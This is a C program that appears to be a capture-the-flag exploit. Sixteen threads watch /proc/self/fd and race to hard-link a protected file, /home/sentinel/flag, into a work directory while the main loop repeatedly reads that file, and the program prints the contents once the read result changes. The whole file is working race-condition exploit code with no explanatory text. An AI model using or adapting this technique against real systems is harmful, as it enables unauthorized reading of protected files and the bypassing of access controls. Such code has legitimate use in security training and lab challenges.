#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define fatal(...) err(EXIT_FAILURE, __VA_ARGS__)
#define fatalx(...) errx(EXIT_FAILURE, __VA_ARGS__)

struct linux_dirent {
    unsigned long  d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};

#define BUF_SIZE 1024

static int _open(char *path, int flags, mode_t mode)
{
    return syscall(SYS_open, path, flags, mode);
}

static int _link(char *oldpath, char *newpath)
{
    return syscall(SYS_link, oldpath, newpath);
}

static int getdents(int dirfd, char *buf, size_t size)
{
    return syscall(SYS_getdents, dirfd, buf, size);
}

static pthread_barrier_t barrier;

static void *link_thread(void *unused)
{
    int ret;
    int dirfd = open("/proc/self/fd", O_RDONLY);
    if (dirfd < 0) {
        fatal("open /proc/self/fd");
    }

    pthread_barrier_wait(&barrier);

    for (;;) {
        bool seen_six = false;
        bool seen_seven = false;
        char buf[BUF_SIZE];
        int nread = getdents(dirfd, buf, BUF_SIZE);
        if (nread == -1) {
            fatal("getdents");
        }

        for (long bpos = 0; bpos < nread;) {
            struct linux_dirent *d = (struct linux_dirent *) (buf + bpos);
            if (d->d_name[0] == '6') {
                seen_six = true;
            } else if (d->d_name[0] == '7') {
                seen_seven = true;
            }

            bpos += d->d_reclen;
        }

        if (lseek(dirfd, 0, SEEK_SET) < 0) {
            fatal("lseek");
        }

        if (seen_six && seen_seven) {
            _link("/home/sentinel/flag", "/home/sentinel/work/flag2");
        }
    }
    return NULL;
}

static void do_stat(char *path)
{
    struct stat statbuf;
    if (stat(path, &statbuf) < 0) {
        fatal("stat");
    }

    printf("%s: st_dev: %lu, st_ino: %lu, st_size: %lu\n", path, statbuf.st_dev, statbuf.st_ino, statbuf.st_size);
}

#define NUM_THREADS 0x10

int main(void)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    pthread_barrier_init(&barrier, NULL, NUM_THREADS + 1);

    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, link_thread, NULL) < 0) {
            fatal("pthread_create");
        }
    }

    pthread_barrier_wait(&barrier);

    for (int i = 0; i < 10000; i++) {
        int flagfd = _open("/home/sentinel/flag", O_RDONLY, 0);
        if (flagfd < 0) {
            fatal("open flag");
        }

        char buf[100] = {0};
        ssize_t read_ret = read(flagfd, buf, sizeof(buf));
        if (read_ret < 0) {
            fatal("read flag");
        }

        if (read_ret != 17) {
            write(1, buf, read_ret);
            exit(0);
        }

        close(flagfd);
        remove("/home/sentinel/work/flag2");
    }
}
